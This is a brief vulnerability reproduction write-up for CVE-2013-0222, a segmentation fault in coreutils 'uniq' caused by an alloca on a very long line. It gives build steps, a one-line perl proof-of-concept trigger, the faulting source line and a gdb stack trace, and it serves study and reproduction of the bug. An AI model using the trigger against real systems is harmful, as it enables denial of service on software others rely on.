# CVE-2013-0222

## Experiment Environment

CentOS 6.4

## INSTALL & Configuration

```
wget https://github.com/mudongliang/source-packages/raw/master/CVE-2013-0222/coreutils-8.4-patched.tar.gz

tar -xvf coreutils-8.4-patched.tar.gz
cd coreutils-8.4
./configure
make
```

## Problems in Installation & Configuration

## How to trigger vulnerability

```
perl -e 'print "1","\0"x50000000,"\r\n\r\n"' | uniq
```

## PoCs

[CVE-2013-0222: coreutils: segmentation fault in "uniq" with long line input](https://bugzilla.novell.com/show_bug.cgi?id=796243)

## Vulnerability Details & Patch

### Root Cause

```
uniq.c:392

	copy[i] = alloca (len[i] + 1);
```

### Stack Trace

```
(gdb) info stack
#0  0x08049ae8 in different_multi (old=<value optimized out>, new=<value optimized out>, oldlen=50000002, 
    newlen=50000002, oldstate=..., newstate=...) at uniq.c:397
#1  0x0804a8d3 in check_file (argc=1, argv=0xbf8f44d4) at uniq.c:513
#2  main (argc=1, argv=0xbf8f44d4) at uniq.c:806
```

## References
